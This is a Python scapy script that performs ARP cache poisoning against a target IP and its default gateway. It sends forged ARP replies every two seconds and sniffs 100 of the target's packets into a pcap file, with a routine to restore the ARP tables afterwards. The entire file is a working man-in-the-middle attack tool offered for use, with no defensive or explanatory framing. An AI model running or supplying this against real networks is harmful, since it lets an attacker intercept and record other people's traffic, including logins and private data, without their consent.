import argparse
import os
import signal
import sys
import threading
import time

import netifaces
from scapy.all import *


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target-ip", dest="target_ip", help="IP address of the target")
    options = parser.parse_args()

    if not options.target_ip:
        parser.error("[-] Please specify the IP address of the target using -t or --target-ip.")

    return options


def get_gateway_ip():
    return netifaces.gateways()['default'][netifaces.AF_INET][0]


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2,retry=10)
    for s, r in responses:
        return r[Ether].src
    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
            print("[*] ARP poison attack finished.")
            return


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
    os.kill(os.getpid(), signal.SIGINT)


def main():
    options = get_arguments()

    # Set up the interface
    interface = "wlan0"
    conf.iface = interface
    conf.verb = 0
    print("[*] Setting up %s" % interface)

    # Get the MAC addresses of the target and the gateway
    gateway_ip = get_gateway_ip()
    gateway_mac = get_mac(gateway_ip)
    target_ip = options.target_ip
    target_mac = get_mac(target_ip)
    packet_count = 100

    if gateway_mac is None:
        print("[!!!] Failed to get gateway MAC. Exiting.")
        sys.exit(0)
    else:
        print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))

    if target_mac is None:
        print("[!!!] Failed to get target MAC. Exiting.")
        sys.exit(0)
    else:
        print("[*] Target %s is at %s" % (target_ip, target_mac))

    # Start the ARP poison thread
    poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()


    try:
        print ("[*] Starting sniffer for %d packets" % packet_count)
        bpf_filter = "ip host " + target_ip
        packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
        wrpcap('arper.pcap', packets)
        print("[*] Packet capture finished.")
    except KeyboardInterrupt:
        print("[*] Stopping packet capture.")
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        poison_thread.join()


if __name__ == '__main__':
    main()
